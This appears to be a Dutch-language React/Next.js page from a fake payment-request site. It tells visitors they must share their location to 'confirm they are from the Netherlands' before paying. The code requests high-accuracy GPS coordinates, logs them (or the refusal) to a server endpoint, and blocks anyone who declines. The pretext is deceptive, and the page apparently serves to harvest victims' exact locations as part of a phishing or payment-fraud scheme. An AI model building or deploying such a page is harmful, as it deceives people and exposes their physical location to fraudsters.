import { useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(false);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  const handleLocation = () => {
    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        // ✅ direct doorsturen
        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setError('Locatie is verplicht om verder te gaan.');
        setLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  return (
    <>
      <style>{`
        html, body {
          margin: 0;
          padding: 0;
          background: #4b4f83;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        }

        .page {
          min-height: 100vh;
          background: #4b4f83;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: flex-start;
          text-align: center;
        }

        .circle {
          margin-top: 24px;
          width: 200px;   /* 20% kleiner */
          height: 200px;
          border-radius: 50%;
          background: #ffffff;
          border: 12px solid #3e4272;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .circle img {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        h1 {
          color: #ffffff;
          font-size: 28px;
          margin: 24px 16px 8px;
        }

        p {
          color: #d7d9ef;
          font-size: 16px;
          margin: 0 24px 24px;
        }

        button {
          background: #ffffff;
          color: #4b4f83;
          border: none;
          border-radius: 12px;
          padding: 16px;
          font-size: 16px;
          width: calc(100% - 48px);
          max-width: 360px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.15);
          cursor: pointer;
        }

        button:disabled {
          opacity: 0.6;
        }

        .error {
          margin-top: 16px;
          color: #ffd6d6;
        }
      `}</style>

      <div className="page">
        <div className="circle">
          <img
            src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
            alt="Verificatie"
          />
        </div>

        <h1>🇳🇱 Bevestig dat je uit Nederland komt</h1>

        <p>
          Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
        </p>

        <button onClick={handleLocation} disabled={loading}>
          {loading ? 'Even geduld…' : 'Bevestigen met locatie'}
        </button>

        {error && <div className="error">{error}</div>}
      </div>
    </>
  );
}
